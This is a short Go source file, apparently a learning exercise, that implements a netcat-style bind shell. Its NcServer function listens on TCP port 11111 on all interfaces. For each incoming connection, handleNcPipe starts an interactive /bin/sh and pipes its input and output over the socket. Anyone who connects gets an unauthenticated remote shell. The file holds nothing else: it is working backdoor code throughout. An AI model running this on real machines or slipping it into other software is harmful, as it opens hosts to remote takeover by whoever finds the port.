package hat

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{w: bufio.NewWriter(w)}
}

func (f *Flusher) Write(p []byte) (n int, err error) {
	n, err = f.w.Write(p)
	if err != nil {
		return -1, err
	}
	if err := f.w.Flush(); err != nil {
		return -1, err
	}
	return n, nil
}

func handleNc(conn net.Conn) {
	// -i flag is used to make the shell interactive
	cmd := exec.Command("/bin/sh", "-i")

	// set the stdin of the command to the connection
	cmd.Stdin = conn
	cmd.Stdout = os.Stdout

	if err := cmd.Run(); err != nil {
		fmt.Printf("cmd.Run: %v\n", err)
	}
}

func nc() {
	// -i flag is used to make the shell interactive
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout

	if err := cmd.Run(); err != nil {
		fmt.Printf("cmd.Run: %v\n", err)
	}
}

func handleNcPipe(conn net.Conn) {
	defer conn.Close()

	// -i flag is used to make the shell interactive
	cmd := exec.Command("/bin/sh", "-i")

	pr, pw := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = pw
	//
	go io.Copy(conn, pr)

	if err := cmd.Run(); err != nil {
		fmt.Printf("cmd.Run: %v\n", err)
	}
}

func NcServer() {
	listener, err := net.Listen("tcp", ":11111")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		// go handleNc(conn)
		go handleNcPipe(conn)
	}
}
